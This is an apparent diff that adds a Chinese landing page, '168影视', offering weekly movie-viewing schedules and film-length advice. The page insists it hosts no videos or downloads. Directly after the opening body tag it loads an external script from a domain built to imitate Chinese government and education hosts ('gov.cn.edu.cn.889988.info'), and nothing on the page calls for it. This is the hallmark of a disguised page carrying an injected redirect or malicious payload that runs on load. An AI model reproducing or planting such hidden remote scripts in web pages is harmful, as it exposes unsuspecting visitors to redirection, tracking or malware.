@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>168影视｜168种好片排期表 · 一周168小时观影计划与片单推荐</title>
+<meta name="description" content="168影视是一份按一周168小时拆分的观影排期手册：把每天通勤、午休、睡前、周末整块时间对应到具体片长与类型，给出电影、剧集、纪录片的排期建议、片单组合与补看顺序，帮你把碎片时间排成一套看得完的观影计划。">
+<meta name="keywords" content="168影视,168小时观影计划,一周观影排期,每日片单推荐,碎片时间看片,剧集补看顺序,电影排期表,纪录片观看计划">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+<meta name="bingbot" content="index,follow">
+<link rel="canonical" href="https://168yingshi-top.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="168影视｜168小时观影计划与一周排期表">
+<meta property="og:description" content="把一周168小时拆成通勤、午休、睡前与周末整块时间，对应具体片长与类型，给出可执行的观影排期与片单组合。">
+<meta property="og:url" content="https://168yingshi-top.github.io/">
+<meta property="og:site_name" content="168影视">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="168影视｜一周168小时观影计划">
+<meta name="twitter:description" content="按时间段挑片的排期手册：通勤短片、午休一集、周末连看，片长与类型都帮你算好。">
+<style>
+:root{
+  --paper:#f7f5f0; --paper2:#fffefb; --ink:#23201d; --ink2:#5b554e;
+  --line:#d8d2c6; --brand:#c8551b; --brand2:#e8934a; --plum:#6b3a5c;
+  --olive:#6e7d3a; --teal:#2f6f6b; --navy:#2c4a63;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",sans-serif;
+  background:var(--paper); color:var(--ink); line-height:1.75; font-size:16px;
+  -webkit-font-smoothing:antialiased;
+}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+/* ---------- top bar ---------- */
+.bar{background:#23201d;color:#f7f5f0;padding:9px 0;font-size:13px}
+.bar .wrap{display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;align-items:center}
+.bar a{color:#e8934a;text-decoration:none}
+.bar em{font-style:normal;color:#b9b2a6}
+/* ---------- header ---------- */
+header{padding:26px 0 18px;border-bottom:1px solid var(--line);background:var(--paper2)}
+header .wrap{display:flex;align-items:center;justify-content:space-between;gap:20px;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:13px;text-decoration:none;color:var(--ink)}
+.logo b{font-size:30px;font-weight:800;letter-spacing:1px;color:var(--brand)}
+.logo b i{font-style:normal;color:var(--plum)}
+.logo span{font-size:13px;color:var(--ink2);border-left:2px solid var(--line);padding-left:12px;line-height:1.5}
+nav{display:flex;gap:6px;flex-wrap:wrap}
+nav a{padding:9px 14px;text-decoration:none;color:var(--ink);font-size:15px;border-radius:3px}
+nav a:hover{background:#eceae3}
+nav a.cta{background:var(--brand);color:#fff;font-weight:700}
+.mbtn{display:none;width:34px;height:26px;position:relative;background:none;border:0;cursor:pointer}
+.mbtn s{position:absolute;left:0;right:0;height:3px;background:var(--ink)}
+.mbtn s:nth-child(1){top:0}.mbtn s:nth-child(2){top:11px}.mbtn s:nth-child(3){top:22px}
+/* ---------- hero ---------- */
+.hero{background:linear-gradient(135deg,#2c4a63 0%,#6b3a5c 52%,#c8551b 100%);color:#fff;padding:64px 0 58px;position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;inset:0;background:
+  radial-gradient(circle at 88% 18%,rgba(232,147,74,.32),transparent 42%),
+  radial-gradient(circle at 8% 82%,rgba(47,111,107,.45),transparent 40%)}
+.hero .wrap{position:relative;z-index:1;display:grid;grid-template-columns:1.35fr .65fr;gap:44px;align-items:center}
+.hero h1{font-size:44px;line-height:1.2;letter-spacing:.5px;margin-bottom:6px}
+.hero h1 small{display:block;font-size:17px;font-weight:400;opacity:.85;margin-top:12px;letter-spacing:2px}
+.hero p{font-size:17px;opacity:.92;max-width:600px;margin:18px 0 26px}
+.htags{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:26px}
+.htags b{background:rgba(255,255,255,.16);border:1px solid rgba(255,255,255,.3);padding:6px 13px;border-radius:20px;font-size:13.5px;font-weight:500}
+.hbtns{display:flex;gap:12px;flex-wrap:wrap}
+.btn{background:#fff;color:#23201d;padding:13px 26px;text-decoration:none;font-weight:700;border-radius:3px;font-size:15.5px}
+.btn.ghost{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.6)}
+/* clock card */
+.clock{background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.26);backdrop-filter:blur(3px);padding:24px 22px;border-radius:6px}
+.clock h4{font-size:13px;letter-spacing:3px;opacity:.8;font-weight:500;margin-bottom:4px}
+.clock .big{font-size:52px;font-weight:800;line-height:1;letter-spacing:2px}
+.clock .big i{font-style:normal;font-size:20px;font-weight:500;opacity:.8;margin-left:8px}
+.clock ul{list-style:none;margin-top:18px;font-size:14px}
+.clock li{padding:9px 0;border-top:1px dashed rgba(255,255,255,.3);display:flex;justify-content:space-between;gap:10px}
+.clock li:first-child{border-top:0}
+.clock li b{font-weight:600;opacity:.92}
+/* ---------- generic section ---------- */
+section{padding:60px 0}
+section:nth-child(odd){background:var(--paper2)}
+.eyebrow{font-size:12.5px;letter-spacing:3px;color:var(--brand);font-weight:700;text-transform:uppercase}
+h2{font-size:29px;margin:8px 0 10px;letter-spacing:.3px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+h2 u{text-decoration:none;background:var(--brand);color:#fff;font-size:15px;padding:4px 11px;border-radius:3px;letter-spacing:1px;font-weight:700}
+.lead{color:var(--ink2);max-width:780px;margin-bottom:34px}
+/* ---------- schedule table ---------- */
+.sched{overflow-x:auto;border:1px solid var(--line);background:#fff;border-radius:5px}
+.sched table{width:100%;border-collapse:collapse;min-width:760px;font-size:14.5px}
+.sched caption{caption-side:top;text-align:left;padding:14px 16px;background:#23201d;color:#fff;font-weight:700;font-size:15px;letter-spacing:1px}
+.sched th{background:#eceae3;padding:12px 14px;text-align:left;font-size:13.5px;letter-spacing:1px;color:var(--ink2);border-bottom:2px solid var(--brand)}
+.sched td{padding:12px 14px;border-bottom:1px solid var(--line);vertical-align:top}
+.sched tr:last-child td{border-bottom:0}
+.sched tr:hover td{background:#fffaf4}
+.sched code{display:inline-block;background:var(--brand);color:#fff;font-size:12px;padding:2px 8px;border-radius:2px;font-family:inherit;white-space:nowrap}
+.sched .tag{display:inline-block;font-size:12px;padding:2px 8px;border-radius:2px;background:#eceae3;color:var(--ink2);white-space:nowrap}
+.sched .tag.n{background:#e6f1f0;color:var(--teal)}
+.sched .tag.w{background:#fbeede;color:var(--brand)}
+.sched .tag.d{background:#ebe6f0;color:var(--plum)}
+/* ---------- four pillars ---------- */
+.pillars{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.pillar{background:#fff;border:1px solid var(--line);border-top:4px solid var(--brand);padding:22px 20px;border-radius:4px}
+.pillar:nth-child(2){border-top-color:var(--teal)}
+.pillar:nth-child(3){border-top-color:var(--olive)}
+.pillar:nth-child(4){border-top-color:var(--navy)}
+.pillar h3{font-size:18px;margin-bottom:8px}
+.pillar p{font-size:14.5px;color:var(--ink2)}
+.pillar .num{font-size:12px;letter-spacing:2px;color:var(--brand);font-weight:700}
+/* ---------- lists ---------- */
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.pane{background:#fff;border:1px solid var(--line);border-radius:5px;overflow:hidden}
+.pane>h3{background:#23201d;color:#fff;padding:13px 18px;font-size:16px;letter-spacing:1px;display:flex;justify-content:space-between;align-items:center}
+.pane>h3 em{font-style:normal;font-size:12px;color:#e8934a;letter-spacing:2px}
+.items{list-style:none}
+.items li{padding:14px 18px;border-bottom:1px dashed var(--line);display:grid;grid-template-columns:52px 1fr;gap:12px}
+.items li:last-child{border-bottom:0}
+.items .no{font-size:12px;font-weight:700;color:var(--brand);border:1px solid var(--brand);border-radius:2px;height:fit-content;padding:3px 6px;text-align:center;letter-spacing:.5px}
+.items h4{font-size:15.5px;margin-bottom:3px}
+.items p{font-size:13.5px;color:var(--ink2)}
+/* ---------- three steps ---------- */
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:0;border:1px solid var(--line);background:#fff;border-radius:5px;overflow:hidden}
+.step{padding:26px 24px;border-right:1px solid var(--line);position:relative}
+.step:last-child{border-right:0}
+.step .ix{font-size:40px;font-weight:800;color:var(--line);line-height:1;margin-bottom:10px}
+.step h3{font-size:18px;margin-bottom:7px}
+.step p{font-size:14.5px;color:var(--ink2)}
+/* ---------- about ---------- */
+.about{display:grid;grid-template-columns:1.1fr .9fr;gap:34px;align-items:start}
+.note{background:#fff;border:1px dashed var(--brand);padding:20px 22px;border-radius:5px;margin-top:22px}
+.note h4{font-size:15px;color:var(--brand);margin-bottom:8px;letter-spacing:1px}
+.note p{font-size:14.5px;color:var(--ink2)}
+/* ---------- faq ---------- */
+.faq{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+details{background:#fff;border:1px solid var(--line);border-radius:4px;padding:0}
+details[open]{border-color:var(--brand)}
+summary{cursor:pointer;padding:15px 18px;font-weight:700;font-size:15.5px;list-style:none;display:flex;justify-content:space-between;gap:12px;align-items:center}
+summary::-webkit-details-marker{display:none}
+summary::after{content:"＋";color:var(--brand);font-size:20px;flex:none}
+details[open] summary::after{content:"－"}
+details p{padding:0 18px 16px;font-size:14.5px;color:var(--ink2)}
+/* ---------- footer ---------- */
+footer{background:#23201d;color:#b9b2a6;padding:44px 0 26px;font-size:14px}
+footer .wrap{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:30px}
+footer h4{color:#fff;font-size:16px;margin-bottom:12px;letter-spacing:1px}
+footer a{color:#e8934a;text-decoration:none;display:block;margin-bottom:7px;font-size:14px}
+footer p{margin-bottom:10px}
+.copy{border-top:1px solid #3d3834;margin-top:28px;padding-top:16px;font-size:13px;color:#8b8379;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+/* ---------- responsive ---------- */
+@media(max-width:900px){
+  .hero .wrap{grid-template-columns:1fr}
+  .pillars,.steps{grid-template-columns:1fr 1fr}
+  .grid2,.about,.faq{grid-template-columns:1fr}
+  footer .wrap{grid-template-columns:1fr 1fr}
+  .hero h1{font-size:34px}
+}
+@media(max-width:660px){
+  .mbtn{display:block}
+  nav{display:none;position:absolute;left:0;right:0;top:100%;background:var(--paper2);border-bottom:1px solid var(--line);padding:10px;z-index:9;flex-direction:column}
+  nav.on{display:flex}
+  nav a{border-radius:0;border-bottom:1px solid var(--line);padding:12px 14px}
+  nav a:last-child{border-bottom:0}
+  .pillars,.steps{grid-template-columns:1fr}
+  footer .wrap{grid-template-columns:1fr}
+  .hero h1{font-size:29px}
+  .clock .big{font-size:42px}
+  h2{font-size:24px}
+  section{padding:44px 0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="bar"><div class="wrap">
+  <span>官方唯一网址：<a href="https://168yingshi-top.github.io/">https://168yingshi-top.github.io/</a></span>
+  <span><em>168影视 · 一周168小时观影排期手册</em></span>
+</div></div>
+
+<header>
+  <div class="wrap">
+    <a class="logo" href="#top">
+      <b>168<i>影视</i></b>
+      <span>把一周168小时<br>排成一套看得完的片单</span>
+    </a>
+    <button class="mbtn" id="mb" aria-label="菜单"><s></s><s></s><s></s></button>
+    <nav id="nv">
+      <a href="#sched">排期总表</a>
+      <a href="#pillars">四类时段</a>
+      <a href="#lists">片单库</a>
+      <a href="#steps">三步排期</a>
+      <a href="#about">关于本站</a>
+      <a href="#faq">常见问题</a>
+      <a class="cta" href="#sched">查看排期表</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="top">
+  <div class="wrap">
+    <div>
+      <div class="htags">
+        <b>168小时</b><b>按时间段挑片</b><b>片长已算好</b><b>零碎片焦虑</b>
+      </div>
+      <h1>168影视<small>ONE WEEK · 168 HOURS SCHEDULE</small></h1>
+      <p>一周有 168 小时，真正能留给屏幕的往往不到二十分之一。168影视不做资源汇总，只做一件事：把通勤、午休、睡前和周末整块时间，对应到合适的片长与类型，给你一份排得满、也看得完的一周观影计划。</p>
+      <div class="hbtns">
+        <a class="btn" href="#sched">打开排期总表</a>
+        <a class="btn ghost" href="#lists">先挑片单</a>
+      </div>
+    </div>
+    <aside class="clock">
+      <h4>一周时间账 · WEEKLY HOURS</h4>
+      <div class="big">168<i>小时</i></div>
+      <ul>
+        <li><span>睡眠</span><b>约 56 小时</b></li>
+        <li><span>工作与通勤</span><b>约 60 小时</b></li>
+        <li><span>家务与杂事</span><b>约 21 小时</b></li>
+        <li><span>可自由观影</span><b>约 18-25 小时</b></li>
+      </ul>
+    </aside>
+  </div>
+</section>
+
+<section id="sched">
+  <div class="wrap">
+    <div class="eyebrow">SCHEDULE TABLE · 01</div>
+    <h2>一周排期总表 <u>7天×4时段</u></h2>
+    <p class="lead">下表按"周一至周日 × 四个固定时段"排布，每段都给出建议片长与类型方向。实际可看时长因人而异，先照表走三天，再按自己的节奏删改。</p>
+    <div class="sched">
+      <table>
+        <caption>168影视 · 一周168小时观影排期总表（建议版）</caption>
+        <thead>
+          <tr><th>时段</th><th>可用时长</th><th>建议片长</th><th>适合类型</th><th>排期思路</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><code>通勤</code></td><td>20-40 分钟</td><td>单集 22-30 分钟</td><td>情景喜剧、单元剧、短纪录片<span class="tag n">日更友好</span></td><td>选能随时断开的单元结构，情节断开也不影响理解</td></tr>
+          <tr><td><code>午休</code></td><td>40-60 分钟</td><td>1 集 45 分钟 / 半部电影</td><td>悬疑、职场、生活剧<span class="tag w">有头有尾</span></td><td>一集必须讲完一个小事件，避免悬在半空</td></tr>
+          <tr><td><code>晚间</code></td><td>90-150 分钟</td><td>1 部电影 / 2 集剧集</td><td>剧情、犯罪、历史、动画<span class="tag">主力时段</span></td><td>一周安排 3 部电影 + 2 晚追剧，节奏最稳</td></tr>
+          <tr><td><code>周末</code></td><td>3-6 小时</td><td>连看 2-3 集 / 1 部长片</td><td>剧集马拉松、纪录剧集、老片连看<span class="tag d">深度档</span></td><td>留出一整块时间给需要连续观看的内容</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section id="pillars">
+  <div class="wrap">
+    <div class="eyebrow">FOUR PILLARS · 02</div>
+    <h2>四类时段，四种挑片逻辑 <u>不混着选</u></h2>
+    <p class="lead">同一部作品放在不同时段，体验差别很大。168影视把一天拆成四档，每档用不同的标准挑片，避免"想看却看不下去"。</p>
+    <div class="pillars">
+      <div class="pillar">
+        <div class="num">PILLAR 01</div>
+        <h3>碎片档 · 20分钟内</h3>
+        <p>通勤、排队、等餐。标准是"随时能停"：单集独立、无长线伏笔、不需要记人物关系。</p>
+      </div>
+      <div class="pillar">
+        <div class="num">PILLAR 02</div>
+        <h3>整块档 · 90分钟</h3>
+        <p>晚间整块时间。标准是"一次讲完"：一部电影或两集剧情，看完有明确的情绪落点。</p>
+      </div>
+      <div class="pillar">
+        <div class="num">PILLAR 03</div>
+        <h3>深度档 · 3小时+</h3>
+        <h3 style="font-size:15px;color:var(--ink2);font-weight:400;margin-top:6px">周末与假期。标准是"值得连看"：纪录剧集、长篇剧集、修复版老片，需要连续投入才有收获。</h3>
+      </div>
+      <div class="pillar">
+        <div class="num">PILLAR 04</div>
+        <h3>陪伴档 · 不限时长</h3>
+        <p>和家人、朋友一起看。标准是"不用解释背景"：类型明确、节奏平顺、争议内容少，边看边聊不尴尬。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="lists">
+  <div class="wrap">
+    <div class="eyebrow">COLLECTIONS · 03</div>
+    <h2>片单库 <u>按时长归档</u></h2>
+    <p class="lead">下面两组片单按"一次能看完"的时长归档，不是按类型或评分。具体片名会随上映与上线情况变化，这里给出的是选片方向与识别方法。</p>
+    <div class="grid2">
+      <div class="pane">
+        <h3>一次 90 分钟以内 <em>MOVIE NIGHT</em></h3>
+        <ul class="items">
+          <li><div class="no">90′</div><div><h4>标准片长档</h4><p>90-110 分钟，最稳妥的晚间档。识别方法：单线叙事、第三幕有明确收束、无大量支线。</p></div></li>
+          <li><div class="no">60′</div><div><h4>午休一集档</h4><p>40-60 分钟单集。识别方法：每集一个独立事件，主线只推进一小步。</p></div></li>
+          <li><div class="no">30′</div><div><h4>通勤单元档</h4><p>20-30 分钟。识别方法：单元剧结构、情景喜剧、短片集，断在哪集都不影响。</p></div></li>
+          <li><div class="no">45′</div><div><h4>半部电影档</h4><p>把 100 分钟左右的长片分两段看，适合午休。识别方法：中段有明显分界点。</p></div></li>
+          <li><div class="no">22′</div><div><h4>极短档</h4><p>动画短片、纪录短片。识别方法：单主题、单一情绪，看完即释放。</p></div></li>
+        </ul>
+      </div>
+      <div class="pane">
+        <h3>一次 3 小时以上 <em>MARATHON</em></h3>
+        <ul class="items">
+          <li><div class="no">3H</div><div><h4>纪录剧集档</h4><p>3-6 集连看。识别方法：每集一个子主题，整体有递进，适合周末下午。</p></div></li>
+          <li><div class="no">4H</div><div><h4>长剧连看档</h4><p>一次 3-4 集。识别方法：单集结尾留钩子、情节密度高，需要连续观看才过瘾。</p></div></li>
+          <li><div class="no">2.5H</div><div><h4>修复长片档</h4><p>导演剪辑版、修复重制版。识别方法：片长明显长于公映版，适合投影或大屏。</p></div></li>
+          <li><div class="no">6H</div><div><h4>老片连看档</h4><p>同一导演或同一系列连看。识别方法：作品间有互文关系，一口气看完理解更深。</p></div></li>
+          <li><div class="no">ALL</div><div><h4>整季补看档</h4><p>一口气补完一整季。识别方法：季终有明确收束，适合长假或周末两天。</p></div></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="steps">
+  <div class="wrap">
+    <div class="eyebrow">HOW TO PLAN · 04</div>
+    <h2>三步排出自己的 168 <u>10分钟搞定</u></h2>
+    <p class="lead">不用从海量片库里挑。先算时间，再定数量，最后按档位填空，三步就能排出一周的观影计划。</p>
+    <div class="steps">
+      <div class="step">
+        <div class="ix">01</div>
+        <h3>算清可用时长</h3>
+        <p>写下本周每天"真正能坐下来看"的时段和分钟数，加总。多数人一周在 18-25 小时之间，别按理想值算。</p>
+      </div>
+      <div class="step">
+        <div class="ix">02</div>
+        <h3>定数量不挑名字</h3>
+        <p>把总时长换算成"几部电影 + 几集剧集"，先确定数量。数量定下来，选片压力就小了一半。</p>
+      </div>
+      <div class="step">
+        <div class="ix">03</div>
+        <h3>按四档填空</h3>
+        <p>把片单按碎片、整块、深度、陪伴四档填回时间表，写进日历。计划落进日历，才叫排期。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="eyebrow">ABOUT · 05</div>
+    <h2>关于 168影视 <u>只做排期</u></h2>
+    <div class="about">
+      <div>
+        <p>168影视是一个观影排期工具型站点，核心是把"一周 168 小时"这个具体数字变成可执行的看片计划。我们整理的是挑片方法、片长参考、时段匹配与排期模板，不托管任何视频文件，也不提供下载、播放或在线观看入口。</p>
+        <p style="margin-top:12px">站内的片长区间、时段划分与选片思路来自公开的上映信息与普遍的观影习惯整理，供个人参考。实际可看时长因人而异，排期表建议先照走三天再调整。</p>
+        <div class="note">
+          <h4>本站定位说明</h4>
+          <p>168影视只提供观影排期与选片建议，不含任何影视资源下载、在线播放或侵权内容索引。本站唯一网址为 <strong style="color:var(--brand)">https://168yingshi-top.github.io/</strong>，请认准该域名，避免误入仿冒站点。</p>
+        </div>
+      </div>
+      <div class="pane">
+        <h3>排期速览 <em>AT A GLANCE</em></h3>
+        <ul class="items">
+          <li><div class="no">168</div><div><h4>一周总小时数</h4><p>7 天 × 24 小时，排期的起点。</p></div></li>
+          <li><div class="no">4</div><div><h4>四个固定时段</h4><p>通勤、午休、晚间、周末，各有各的挑片标准。</p></div></li>
+          <li><div class="no">18-25</div><div><h4>多数人可用观影时长</h4><p>单位：小时/周，按此估算最不容易排爆。</p></div></li>
+          <li><div class="no">3+2</div><div><h4>晚间档推荐配比</h4><p>一周 3 部电影 + 2 晚追剧，节奏最稳。</p></div></li>
+          <li><div class="no">0</div><div><h4>提供的播放入口</h4><p>本站不提供任何下载与在线播放功能。</p></div></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="faq">
+  <div class="wrap">
+    <div class="eyebrow">FAQ · 06</div>
+    <h2>常见问题 <u>关于排期与内容</u></h2>
+    <div class="faq">
+      <details open>
+        <summary>168 这个数字是什么意思？</summary>
+        <p>一周有 7 天 × 24 小时 = 168 小时。168影视的命名来自这个具体数字，用意是提醒：可自由支配的观影时间远比想象中少，排期要按真实时长来，而不是按"有空再看"。</p>
+      </details>
+      <details>
+        <summary>片单里的具体片名会更新吗？</summary>
+        <p>本站以片长区间、类型方向与选片方法为主，不维护实时片库。具体片名会随上映与上线情况变化，建议结合自己常用的正规影视平台查询片长与上线状态。</p>
+      </details>
+      <details>
+        <summary>排期表一定要严格照做吗？</summary>
+        <p>不用。排期表是起点不是约束，建议先照走三天，再根据实际可看时长和当天心情删改。排期的意义是减少"选片"消耗的时间，不是增加负担。</p>
+      </details>
+      <details>
+        <summary>本站提供影视资源下载或在线观看吗？</summary>
+        <p>不提供。168影视只做观影排期与选片建议，不含任何下载链接、播放入口或资源索引，也不托管任何视频文件。请通过正规平台观看。</p>
+      </details>
+      <details>
+        <summary>如何把排期同步到自己的日历？</summary>
+        <p>把"时段 + 片长 + 片名"三栏抄进手机日历即可，每档设置 15 分钟缓冲。同步后计划才算真正落地，这也是本站三步法的最后一步。</p>
+      </details>
+      <details>
+        <summary>唯一网址是什么？</summary>
+        <p>本站唯一网址为 <a href="https://168yingshi-top.github.io/" style="color:var(--brand)">https://168yingshi-top.github.io/</a>，其他近似域名均非本站，请认准该地址。</p>
+      </details>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div>
+      <h4>168影视</h4>
+      <p>一周 168 小时观影排期手册。把通勤、午休、睡前与周末整块时间，对应到合适的片长与类型，给你一份排得满也看得完的观影计划。</p>
+      <p>官方网址：<a href="https://168yingshi-top.github.io/">https://168yingshi-top.github.io/</a></p>
+    </div>
+    <div>
+      <h4>栏目导航</h4>
+      <a href="#sched">排期总表</a>
+      <a href="#pillars">四类时段</a>
+      <a href="#lists">片单库</a>
+      <a href="#steps">三步排期</a>
+    </div>
+    <div>
+      <h4>站点信息</h4>
+      <a href="#about">关于本站</a>
+      <a href="#faq">常见问题</a>
+      <a href="#top">返回顶部</a>
+    </div>
+  </div>
+  <div class="wrap copy">
+    <span>© 168影视 · 观影排期手册 · 只提供排期与选片建议，不含任何下载与在线播放入口</span>
+    <span>唯一网址：https://168yingshi-top.github.io/</span>
+  </div>
+</footer>
+
+<script>
+var mb=document.getElementById('mb'),nv=document.getElementById('nv');
+mb.addEventListener('click',function(){nv.classList.toggle('on')});
+nv.addEventListener('click',function(e){if(e.target.tagName==='A'){nv.classList.remove('on')}});
+var links=document.querySelectorAll('nav a');
+var targets=[];
+links.forEach(function(a){
+  var el=document.querySelector(a.getAttribute('href'));
+  if(el) targets.push({a:a,el:el});
+});
+window.addEventListener('scroll',function(){
+  var pos=window.scrollY+140,y=0;
+  targets.forEach(function(t){
+    if(t.el.offsetTop<=pos){y=t.a}
+  });
+  links.forEach(function(a){a.classList.remove('on')});
+  if(y){y.classList.add('on')}
+});
+</script>
+</body>
+</html>
